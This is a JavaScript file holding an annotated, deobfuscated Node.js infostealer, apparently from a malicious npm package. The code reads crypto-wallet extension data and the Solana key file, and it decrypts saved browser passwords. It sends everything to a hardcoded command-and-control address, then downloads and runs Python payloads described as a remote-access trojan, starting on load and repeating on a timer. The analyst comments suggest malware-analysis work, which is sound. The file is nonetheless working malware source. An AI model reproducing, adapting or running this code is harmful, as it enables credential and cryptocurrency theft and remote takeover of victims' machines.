Object.prototype.hasOwnProperty,
  Object.prototype.toString,
  Object.defineProperty,
  Object.getOwnPropertyDescriptor;

///////////////////////////////////////
// Imports
///////////////////////////////////////

const os = require("os");
const fs = require("fs");
const path = require("path");
const request = require("request");
const child_process = require("child_process");
const sqlite3 = require("sqlite3");
const crypto = require("crypto");

///////////////////////////////////////
// Variables
///////////////////////////////////////

const homedir = os["homedir"]();
const platform = os["platform"]();
const hostname = os["hostname"]();
const tmpdir = os["tmpdir"]();

const c2cURL = "http://167.88.168.152:1224";
const threatActorsName = "2Team6";

/**
 *  Array Indexes Meaning
 *  0 => MacOS
 *  1 => Linux
 *  2 => Windows
 */
const browserDataPaths = [
  [
    "/Library/Application Support/Google/Chrome",
    "/.config/google-chrome",
    "/AppData/Local/Google/Chrome/User Data",
  ],
  [
    "/Library/Application Support/BraveSoftware/Brave-Browser",
    "/.config/BraveSoftware/Brave-Browser",
    "/AppData/Local/BraveSoftware/Brave-Browser/User Data",
  ],
  [
    "/Library/Application Support/com.operasoftware.Opera",
    "/.config/opera",
    "/AppData/Roaming/Opera Software/Opera Stable/User Data",
  ],
];

const targetExtensions = [
  "nkbihfbeogaeaoehlefnkodbefgpgknn", // Metamask
  "ejbalbakoplchlghecdalmeeeajnimhm", // Unknown or Removed from Chrome Web Store
  "fhbohimaelbohpjbbldcngcnapndodjp", // Binance Wallet
  "hnfanknocfeofbddgcijnmhnfnkdnaad", // Coinbase Wallet extension
  "bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom
  "fnjhmkhhmkbjkkabndcnnogagogbneec", // Ronin Wallet
  "cfbfdhimifdmdehjmkdobpcjfefblkjm", // Plug
  "ibnejdfjmmkpcnlpebklmnkoeoihofec", // TronLink
  "hifafgmccdpekplomjjkcfgodnhcellj", // Crypto.com | Wallet Extension
  "aeachknmefphepccionboohckonoeemg", // Coin98 Wallet
];

let currentEpochTime; // Used to store Current DateTime
let currentZipSize = 0; // Used for checking downloaded python zip for windows

///////////////////////////////////////
// Utility Functions
///////////////////////////////////////

const getHomeDirPath = (t) =>
  t.replace(/^~([a-z]+|\/)/, (t, c) =>
    "/" === c ? homedir : `${path.dirname(homedir)}/${c}`
  );

// Used to check whether user has permission to access the resource specified by 'dataPath'
function checkPathAccess(dataPath) {
  try {
    fs["accessSync"](dataPath);
    return true;
  } catch (err) {
    return false;
  }
}

// Extracts the Zip using tar
const extractPythonExeZip = async (zipPath) => {
  // Creates a child process to extract the zip file in homedir
  child_process(
    `tar -xf ${zipPath} -C ${homedir}`,
    (errorException, stdout, stderr) => {
      if (errorException) return fs["rmSync"](zipPath), void (st = 0);
      fs["rmSync"](zipPath), StealBrowsersAndSystemData();
    }
  );
};

// Interval Function to run job every 20 seconds
function pythonZipDownloadJobSchedule() {
  setTimeout(() => {
    DownloadAndExtractPythonExecutableZip();
  }, 2e4);
}

///////////////////////////////////////
// Main Functions
///////////////////////////////////////

// This is the first main function which is used to exfiltrate chromium browsers crypto extensions data
const StealBrowserExtensionsData = async () => {
  try {
    const homeDirPath = getHomeDirPath("~/");

    // Loop through each supported browser
    browserDataPaths.forEach(async (value, index) => {
      // Get the browser data path with respect to the OS
      let browserDataPathOS =
        "d" == platform[0] // Check for MacOS
          ? `${homeDirPath}${value[0]}`
          : "l" == platform[0] // Check for Linux
          ? `${homeDirPath}${value[1]}`
          : `${homeDirPath}${value[2]}`; // Default Windows

      await (async (browserPath, browserIdentifier, isChrome) => {
        let tmpPath = browserPath;

        // Browser Path was not detected
        if (!tmpPath || "" === tmpPath) return [];

        // Checks whether user has access to the browser data path
        if (!checkPathAccess(tmpPath)) return [];

        // Assign default empty string if not present
        browserIdentifier || (browserIdentifier = "");

        let exfiltratedData = [];

        // Loop is for Default & Other Browser Profiles upto 200
        for (let j = 0; j < 200; j++) {
          // Get the ExtensionSettingsPath
          const extensionsMainPath = `${browserPath}/${
            0 === j ? "Default" : `Profile ${j}`
          }/Local Extension Settings`;

          // Loop through the various extensions
          for (let i = 0; i < targetExtensions.length; i++) {
            const extension = targetExtensions[i];

            let fullExtensionPath = `${extensionsMainPath}/${extension}`;

            // Check whether the current user has access to the requested extension
            if (checkPathAccess(fullExtensionPath)) {
              try {
                // Read the contents of the extension directory
                extensionContents = fs["readdirSync"](fullExtensionPath);
              } catch (error) {
                extensionContents = [];
              }

              // Loop through all the Extension files
              extensionContents.forEach(async (file) => {
                tmpPath = path.join(fullExtensionPath, file);

                try {
                  // Only if the file is a log file or a lock file
                  // Ref: https://dfir.blog/deciphering-browser-hieroglyphics-leveldb-filesystem/
                  (tmpPath.includes(".ldb") || tmpPath.includes(".log")) &&
                    // Read contents of file and append to a custom output payload
                    exfiltratedData.push({
                      value: fs["createReadStream"](tmpPath),
                      options: {
                        filename: `${browserIdentifier}${isChrome}_${extension}_${file}`,
                      },
                    });
                } catch (error) {}
              });
            }
          }
        }

        // Try to read content of solana wallet json file if it exists
        // TODO: WHAT DOES THIS FILE CONTAIN
        if (
          isChrome &&
          ((tmpPath = `${os.homedir()}/.config/solana/id.json`),
          fs["existsSync"](tmpPath))
        ) {
          try {
            exfiltratedData.push({
              value: fs["createReadStream"](tmpPath),
              options: { filename: "solana_id.txt" },
            });
          } catch (error) {}
        }

        const exfiltratedDataPayload = {
          timestamp: currentEpochTime.toString(),
          type: threatActorsName,
          hid: hostname,
          multi_file: exfiltratedData,
        };

        // Tries to send the data to C2C server via POST request and deprecated node module
        try {
          const requestPayload = {
            url: `${c2cURL}/uploads`,
            formData: exfiltratedDataPayload,
          };

          // Deprecated Module : https://www.npmjs.com/package/request
          request["post"](requestPayload, (err, resp, body) => {});
        } catch (error) {}

        return exfiltratedData;
      })(browserDataPathOS, `${index}_`, 0 == index);
    });
  } catch (error) {}
};

/**
 * The is the second main function which downloads and executes python scripts which are used
 * to steal browser data, system data and install a R.A.T on the system 
*/
const StealBrowsersAndSystemData = async () =>
  await new Promise((resolve, reject) => {
    // Check if Windows Platform
    if ("w" == platform[0]) {
      // Double slash is for escape chracter
      const pythonExePath = `${homedir}\\.pyp\\python.exe`;

      // Checks if Python is installed
      if (fs["existsSync"](`${pythonExePath}`)) {
        (() => {
          const payloadURL = `${c2cURL}/client/${threatActorsName}`,
            payloadStoragePath = `${homedir}/.npl`,
            payloadExecutionCommand = `"${homedir}\\.pyp\\python.exe" "${payloadStoragePath}"`;

          // Remove the payload if previously created
          try {
            fs["rmSync"](payloadStoragePath);
          } catch (error) {}

          // Download the python payload from C2C Server
          request["get"](payloadURL, (err, resp, body) => {
            try {
              fs["writeFileSync"](payloadStoragePath, body),
                // Run the python script as a child process by using exec system call
                child_process["exec"](
                  payloadExecutionCommand,
                  (errorException, stdout, stderr) => {
                    errorException && DownloadWindowsPayloadAndStealPasswords();
                  }
                );
            } catch (err) {
              DownloadWindowsPayloadAndStealPasswords();
            }
          });
        })();
      } else {
        DownloadWindowsPayloadAndStealPasswords();
        DownloadAndExtractPythonExecutableZip();
      }
    }
    // For Other Platforms, Download & Run the Python Payload
    else
      (() => {
        const payloadURL = `${c2cURL}/client/${threatActorsName}`,
          payloadOutputFile = `${homedir}/.npl`;

        let payloadExecutionCommand = `python3 "${payloadOutputFile}"`;

        request["get"](payloadURL, (err, resp, body) => {
          fs["writeFileSync"](payloadOutputFile, body),
            child_process(
              payloadExecutionCommand,
              (errorException, stdout, stderr) => {}
            );
        });
      })();
  });

const DownloadWindowsPayloadAndStealPasswords = async () => {
  var nodeVersion = process.version.match(/^v(\d+\.\d+)/)[1];

  const payloadURL = `${c2cURL}/node/${nodeVersion}`,
    storeNodePayload = `${homedir}/store.node`;

  // Checking if payload exists then perform task
  if (fs["existsSync"](storeNodePayload)) {
    try {
      // Iterate through each windows browser paths and steal passwords
      browserDataPaths.forEach((val, idx) => {
        StealWindowsBrowserPasswords(idx, val[2]);
      });
    } catch {}
  }

  // Else, download it from C2C server then perform task
  // Payload is Windows PE DLL file
  // https://www.virustotal.com/gui/file/c5a73896dc628c23a0b6210f50019445e2b8bfc9770f4c81e1fed097f02dfade/details
  else {
    child_process(
      `curl -Lo "${storeNodePayload}" "${payloadURL}"`,
      (errorException, stdout, stderr) => {
        try {
          // Iterate through each windows browser paths and steal passwords
          browserDataPaths.forEach((val, idx) => {
            StealWindowsBrowserPasswords(idx, val[2]);
          });
        } catch {}
      }
    );
  }
};

const StealWindowsBrowserPasswords = (index, browserDataPath) => {
  try {
    const storeNodePayloadDll = require(`${homedir}/store.node`);

    // Check for Windows OS
    if (os["type"]() != "Windows_NT") return;

    const absoulteBrowserDataPath = `${getHomeDirPath("~/")}${browserDataPath}`;

    // TODO: What is purpose of Local State file
    let browserLocalStateFilePath = path.join(
      absoulteBrowserDataPath,
      "Local State"
    );

    fs["readFile"](browserLocalStateFilePath, "utf-8", (err, data) => {
      if (!err) {
        // Get the encrypted_key from browser state file
        mkey = JSON.parse(data);
        mkey = mkey["os_crypt"]["encrypted_key"];

        mkey = ((t) => {
          // Decode base64 string
          var c = atob(t),
            r = new Uint8Array(c.length);

          // Convert the characters to its Unicode value
          for (let t = 0; t < c.length; t++) {
            r[t] = c.charCodeAt(t);
          }

          return r;
        })(mkey);

        try {
          // Decrypt the encryption_key using CryptUnprotectData method which comes from CRYPT32.dll which comes from the store.node file
          const encyptionKey = storeNodePayloadDll["CryptUnprotectData"](
            mkey.slice(5)
          );

          // Loop through available browser profiles upto 200
          for (idx = 0; idx <= 200; idx++) {
            const browserProfilePath = 0 === idx ? "Default" : `Profile ${idx}`,
              loginDataSqlFile = `${absoulteBrowserDataPath}/${browserProfilePath}/Login Data`,
              loginDataSqlFileCopy = `${absoulteBrowserDataPath}/t${browserProfilePath}`;

            // Checks whether user has access to the login data file
            if (!checkPathAccess(loginDataSqlFile)) continue;

            const payloadIdentifier = `${index}_${idx}_Profile`;

            // Creates a copy of the login data sql file
            fs["copyFile"](loginDataSqlFile, loginDataSqlFileCopy, (c) => {
              try {
                // Open DB File using Sqllite
                const loginDataDB = new sqlite3["Database"](
                  loginDataSqlFileCopy
                );

                // Runs an SQL query to extract all the credentials
                loginDataDB.all("SELECT * FROM logins", (err, rows) => {
                  var exfiltratedData = "";

                  err ||
                    rows.forEach((row) => {
                      // Select credentials from the row
                      var originUrl = row["origin_url"],
                        username = row["username_value"],
                        password = row["password_value"];

                      try {
                        if ("v" === password.subarray(0, 1).toString()) {
                          iv = password.subarray(3, 15);
                          cip = password.subarray(15, password.length - 16);

                          // Decrypts the data
                          if (cip.length) {
                            decryptedData = crypto["createDecipheriv"](
                              "aes-256-gcm",
                              encyptionKey,
                              iv
                            ).update(cip);

                            // Append to the existing output
                            exfiltratedData = `${exfiltratedData}W: ${originUrl} U:  ${username} P: ${decryptedData.toString(
                              "latin1"
                            )}\n\n`;
                          }
                        }
                      } catch (err) {}
                    });

                  // Close the DB Connection
                  loginDataDB.close();

                  // Remove the Copied File
                  fs["unlink"](loginDataSqlFileCopy, () => {});

                  // Prepare the request payload
                  const formData = {
                      ts: currentEpochTime.toString(),
                      type: threatActorsName,
                      hid: "comp",
                      ss: payloadIdentifier,
                      cc: exfiltratedData.toString(),
                    },
                    requestPayload = { url: `${c2cURL}/keys`, formData };

                  try {
                    // Exfiltrate Passwords data to the C2C Server using POST request
                    request["post"](requestPayload, (err, resp, body) => {});
                  } catch (t) {}
                });
              } catch (err) {}
            });
          }
        } catch (err) {}
      }
    });
  } catch (err) {}
};

const DownloadAndExtractPythonExecutableZip = () => {
  const payloadURL = `${c2cURL}/pdown`,
    tempPayloadName = `${tmpdir}\\p.zi`,
    origPayloadName = `${tmpdir}\\p2.zip`;

  const pythonZipSize = 51476596;

  if (currentZipSize < pythonZipSize) {
    // Check if Zip File exists
    if (fs["existsSync"](tempPayloadName)) {
      try {
        var zipFileStats = fs["statSync"](tempPayloadName);

        // Check whether zip is corrupt based on predefined size
        if (zipFileStats.size >= pythonZipSize) {
          currentZipSize = zipFileStats.size;

          // Exact size meaning zip is downloaded successfully, hence rename it to .zip and extract it
          fs.rename(tempPayloadName, origPayloadName, (err) => {
            if (err) throw err;
            extractPythonExeZip(origPayloadName);
          });
        } else {
          if (currentZipSize < zipFileStats.size) {
            currentZipSize = zipFileStats.size;
          } else {
            fs.rmSync(tempPayloadName);
            currentZipSize = 0;
          }
          pythonZipDownloadJobSchedule();
        }
      } catch {}
    } else {
      // Download and Extract the Zip File
      child_process(
        `curl -Lo "${tempPayloadName}" "${payloadURL}"`,
        (errorException, _, _) => {
          if (errorException)
            // Error Happended, reset the size and re run the job
            return (currentZipSize = 0), void pythonZipDownloadJobSchedule();

          // Update the currentZipSize so that this code may not rerun
          try {
            (currentZipSize = pythonZipSize),
              fs["renameSync"](tempPayloadName, origPayloadName),
              extractPythonExeZip(origPayloadName);
          } catch {}
        }
      );
    }
  }
};

/**
 * In summary, the code appears to create a cycle where the main() function
 * is called asynchronously, and after certain conditions are met (counter less than 4),
 * it continues to call main() at regular intervals. Once counter becomes equal to
 * or greater than 4, the interval is cleared, stopping the further execution
 * of the interval function.
 */
var counter = 0;
const main = async () => {
  try {
    (currentEpochTime = Date.now()),
      await StealBrowserExtensionsData(),
      StealBrowsersAndSystemData();
  } catch (t) {}
};
main();

// Run every 10 minutes (600,000 milliseconds)
let jobInterval = setInterval(() => {
  (counter += 1) < 4 ? main() : clearInterval(jobInterval);
}, 6e5);

module.exports = main;
